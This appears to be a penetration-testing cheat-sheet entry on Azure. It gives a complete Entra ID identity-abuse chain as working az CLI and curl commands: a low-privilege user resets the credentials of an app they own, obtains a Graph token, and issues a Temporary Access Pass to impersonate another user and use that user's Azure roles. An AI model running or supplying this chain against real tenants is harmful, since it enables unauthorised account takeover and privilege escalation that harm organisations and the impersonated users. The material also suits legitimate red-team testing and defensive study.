# Azure

Entra ID identity abuse chain — low-priv user → over-permissioned app → impersonate a target user → abuse their Azure RBAC role:

```bash
az login --username <user>@<tenant> --allow-no-subscriptions

# find an Entra app you own/co-own (ownership lets you manage its credentials)
az ad app list --display-name "<app>" --query "[].{name:displayName, appId:appId, id:id}"
az ad app credential reset --id <appId> --append --display-name "x" --years 1

# app-only Graph token using the new client secret
curl -X POST https://login.microsoftonline.com/<tenantId>/oauth2/v2.0/token \
  -d "client_id=<appId>" -d "client_secret=<secret>" -d "grant_type=client_credentials" \
  -d "scope=https://graph.microsoft.com/.default"

# if the app has a permission like UserAuthenticationMethod.ReadWrite.All, you can
# issue a Temporary Access Pass for another user and log in as them with no password:
curl -X POST -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" \
  https://graph.microsoft.com/v1.0/users/<target-upn>/authentication/temporaryAccessPassMethods \
  -d '{"lifetimeInMinutes": 60, "isUsableOnce": false}'
# then sign in to the portal/CLI as <target-upn> with the returned TAP, and use
# whatever Azure RBAC role that user holds.
```
